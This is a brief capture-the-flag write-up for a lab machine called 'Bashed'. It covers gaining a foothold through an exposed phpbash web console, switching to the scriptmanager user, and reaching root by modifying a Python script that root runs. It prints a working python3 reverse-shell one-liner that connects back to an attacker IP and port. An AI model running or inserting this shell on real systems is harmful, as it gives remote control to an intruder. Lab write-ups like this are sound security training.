+++
title = 'Bashed'
description = 'Easy Linux'
writeup = true
hideMeta = true
+++

nmap scan shows port 80 open

do some enumeration, and fuzz - find that there is a directory "/dev"
![Bashed (Easy Linux).png](Bashed%20%28Easy%20Linux%29.png)

clicking phpbash seems to open up a console

![Bashed (Easy Linux)-1.png](Bashed%20%28Easy%20Linux%29-1.png)
we can effectively run as scriptmanager user using `sudo -u scriptmanager`

The bash reverse shells weren't really working, but there is python3 on the box so we use a python3 reverse shell instead:
```python
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("10.10.16.196",9000)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash","-i"])'
```

![Bashed (Easy Linux)-2.png](Bashed%20%28Easy%20Linux%29-2.png)

we are script manager and seeing the root directory, there is a directory called scripts

We find in /scripts a test.py file which is owned by scriptmanager and a test.txt file owned by root - the test.py file contains code which writes this test.txt file
But running `python3 test.py` doesnt work because we dont have permission to write as test.txt is owned by root

This lead me to think there was a cron job or something somewhere
Looking into it couldnt really find anything but I looked at test.txt and it had changed based on what I had put in the python code:

![Bashed (Easy Linux)-3.png](Bashed%20%28Easy%20Linux%29-3.png)

So lets try put reverse shell code in the file

and we got it
![Bashed (Easy Linux)-5.png](Bashed%20%28Easy%20Linux%29-5.png)

![Bashed (Easy Linux)-4.png](Bashed%20%28Easy%20Linux%29-4.png)

![Bashed (Easy Linux)-6.png](Bashed%20%28Easy%20Linux%29-6.png)

